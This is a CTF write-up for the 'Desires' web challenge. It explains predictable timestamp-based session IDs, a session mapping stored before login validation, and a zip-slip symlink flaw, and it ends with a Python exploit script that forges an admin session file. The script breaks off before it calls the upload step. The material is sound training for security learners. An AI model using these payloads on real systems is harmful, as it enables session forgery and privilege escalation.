# Desires - CTF Web Challenge Writeup

## Challenge Overview

**Challenge Name:** Desires  
**Category:** Web  
**Difficulty:** Easy

This challenge consists of two services:
1. **SSO Service** (Node.js/Express on port 8080) - Handles user authentication
2. **Main Service** (Go/Fiber on port 1337) - Handles file uploads and admin access

The goal is to gain admin privileges and access the `/user/admin` endpoint to retrieve the flag.

---

## Architecture

### SSO Service (Port 8080)
- SQLite database with users table
- Endpoints: `/register`, `/login`
- Stores users with roles (default: "user")

### Main Service (Port 1337)
- Uses Redis to store session mappings
- File-based session storage in `/tmp/sessions/<username>/<sessionID>`
- Endpoints:
  - `/register` - Create account
  - `/login` - Authenticate
  - `/user/upload` - Upload zip archives (authenticated)
  - `/user/admin` - Admin-only page with flag

---

## Vulnerabilities

### 1. Insecure session ID generation

The session ID is generated using a weak hash based on Unix timestamp:

```go
sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(strconv.FormatInt(time.Now().Unix(), 10))))
```

**Issue:** 
- Session IDs are predictable since they're based on Unix timestamps
- An attacker can guess the session ID by hashing timestamps around the login time
- The timestamp has only 1-second precision, making brute-forcing feasible

### 2. Session created before authentication

In the `LoginHandler` function:

```go
func LoginHandler(c *fiber.Ctx) error {
    var credentials Credentials
    if err := c.BodyParser(&credentials); err != nil {
        return utils.ErrorResponse(c, err.Error(), http.StatusBadRequest)
    }

    sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(strconv.FormatInt(time.Now().Unix(), 10))))

    err := PrepareSession(sessionID, credentials.Username)  // Stores in Redis
    
    if err != nil {
        return utils.ErrorResponse(c, "Error wrong!", http.StatusInternalServerError)
    }

    user, err := loginUser(credentials.Username, credentials.Password)  // Validates credentials
    if err != nil {
        return utils.ErrorResponse(c, "Invalid username or Password", http.StatusBadRequest)
    }

    sessId := CreateSession(sessionID, user)  // Creates session file
    // ...
}
```

**Issue:**
- `PrepareSession` stores the username → sessionID mapping in Redis **before** credentials are validated
- Even with wrong password, the mapping is stored in Redis
- The session file is only created after successful authentication
- This creates a race condition we can exploit

### 3. Zip-Slip vulnerability

The upload handler uses `archiver.Unarchive` without path validation:

```go
func UploadEnigma(c *fiber.Ctx) error {
    // ... file upload code ...
    
    userFolder := filepath.Join("./files", userStruct.Username)
    if _, err := os.Stat(userFolder); os.IsNotExist(err) {
        if err := os.MkdirAll(userFolder, 0755); err != nil {
            log.Fatal(err)
        }
    }

    err = archiver.Unarchive(tempFile, userFolder)
    // No path validation!
}
```

**Issue:**
- No validation of file paths in the archive
- Can create symbolic links
- Can write files outside the intended directory using symlink tricks

---

## Exploitation

### Attack flow

1. Create victim account (admin_user) that we want to escalate
2. Create attacker account (upload_user) for uploading malicious archives
3. Trigger session creation for victim without valid password → stores in Redis
4. Calculate/guess the session ID 
5. Use zip slip to write malicious session file to victim's session directory
6. Access admin endpoint with victim's credentials

### Step 1: Create 2 accounts

Create the victim account:
```http
POST /register HTTP/1.1
Host: target:1337
Content-Type: application/x-www-form-urlencoded

username=admin_user&password=test
```

Create the attacker account:
```http
POST /register HTTP/1.1
Host: target:1337
Content-Type: application/x-www-form-urlencoded

username=upload_user&password=test
```

### Step 2: Login with test accounts

Login as admin_user (remember the session cookies):
```http
POST /login HTTP/1.1
Host: target:1337
Content-Type: application/x-www-form-urlencoded

username=admin_user&password=test
```

Login as upload_user:
```http
POST /login HTTP/1.1
Host: target:1337
Content-Type: application/x-www-form-urlencoded

username=upload_user&password=test
```

### Step 3: Store Session ID in Redis Without Authentication

Make a failed login attempt for admin_user:
```http
POST /login HTTP/1.1
Host: target:1337
Content-Type: application/x-www-form-urlencoded

username=admin_user&password=wrongpassword
```

**What happens:**
1. Session ID is generated: `sha256(current_timestamp)`
2. Redis stores: `admin_user` → `<sessionID>`
3. Authentication fails, so no session file is created
4. But the Redis mapping remains!

### Step 4: Calculate the session ID

Since we know approximately when the request was made, we can calculate the session ID:

```python
import hashlib
import time

def generate_session_id():
    timestamp = str(int(time.time()))
    sha = hashlib.sha256(timestamp.encode()).hexdigest()
    return sha

# Calculate the session ID at the time of the failed login
sessID = generate_session_id()
print(f"Predicted Session ID: {sessID}")
```

### Step 5: Create malicious ZIP archive

Create a zip file that:
1. First creates a symlink pointing to the victim's session directory
2. Then writes a file through that symlink with admin role

```python
import zipfile

def create_zip(zip_path, username, sessID):
    with zipfile.ZipFile(zip_path, 'w') as zip_ref:
        # Create a symlink pointing to victim's session file
        symlink_target = f"/tmp/sessions/{username}/{sessID}"
        symlink_info = zipfile.ZipInfo('./x')
        symlink_info.external_attr = 0o120777 << 16  # Symlink attributes
        zip_ref.writestr(symlink_info, symlink_target)
        
        # Write malicious session data (with admin role)
        regular_file_content = b'{"username":"admin_user","id":1,"role":"admin"}\n'
        zip_ref.writestr('./x', regular_file_content)

create_zip("poc.zip", "admin_user", sessID)
```

**How this works:**
- The archive contains two entries with the same name `./x`
- First entry: symlink to `/tmp/sessions/admin_user/<sessionID>`
- Second entry: regular file with admin session data
- When extracted, the symlink is created first, then the file is written through it
- This overwrites the victim's session file (or creates it if it doesn't exist)

### Step 6: Upload the malicious archive

Upload the archive as the attacker user:

```http
POST /user/upload HTTP/1.1
Host: target:1337
Cookie: session=<upload_user_session>; username=upload_user
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="archive"; filename="poc.zip"
Content-Type: application/zip

[Binary ZIP data]
------boundary--
```

The archive is extracted to `./files/upload_user/`, but the symlink causes the session file to be written to `/tmp/sessions/admin_user/<sessionID>`.

### Step 7: Access admin endpoint

Now we can access the admin endpoint as admin_user:

```http
GET /user/admin HTTP/1.1
Host: target:1337
Cookie: session=<admin_user_session>; username=admin_user
```

Since the session file now contains `"role":"admin"`, the check passes and we get the flag.

---

## Exploit script

```python
import zipfile
import os
import io
import requests
import hashlib
import time

#URL = "http://172.17.0.1:1337/"
URL = "http://83.136.255.244:54321/"
ZIP_FILE = "poc.zip"

admin_session = requests.Session()
upload_session = requests.Session()

upload_session.proxies = {"http" : "http://127.0.0.1:8080"} # Set proxie
admin_session.proxies = {"http" : "http://127.0.0.1:8080"}

def create_user(s, URL, username):
    data = {"username" : username, "password" : "test"}
    return s.post(URL + "register", data=data).status_code == 302

def login_user(s, URL, username, password):
    data = {"username" : username, "password" : password}
    return s.post(URL + "login", data=data, allow_redirects = False).cookies.get_dict()

def generate_session_id():
    timestamp = str(int(time.time()))
    sha = hashlib.sha256(timestamp.encode()).hexdigest()
    return sha

def store_sessID_in_redis(s, URL, username):
    data = {"username" : username, "password" : "blablabla"}
    sessID = generate_session_id()
    s.post(URL + "login", data=data)
    return sessID

def create_zip(zip_path, username, sessID):
    with zipfile.ZipFile(zip_path, 'w') as zip_ref:
        symlink_target = f"/tmp/sessions/{username}/{sessID}"
        symlink_info = zipfile.ZipInfo('./x')
        symlink_info.external_attr = 0o120777 << 16
        zip_ref.writestr(symlink_info, symlink_target)
        regular_file_content = b'{"username":"admin_user","id":1,"role":"admin"}\n'
        zip_ref.writestr('./x', regular_file_content)

def upload_file(s, URL, filename, cookies):
    file = {"archive" : open(filename, "rb")}
    page = s.post(URL + "user/upload", files=file).text
    print(page)


if __name__ == "__main__":
    create_user(admin_session, URL, "admin_user")
    create_user(upload_session, URL, "upload_user")
    print(login_user(admin_session, URL, "admin_user", "test"))
    time.sleep(1)
    cookies = login_user(upload_session, URL, "upload_user", "test")
    sessID = store_sessID_in_redis(admin_session, URL, "admin_user")
    print(sessID)
    create_zip("poc.zip", "admin_user", sessID)
```

---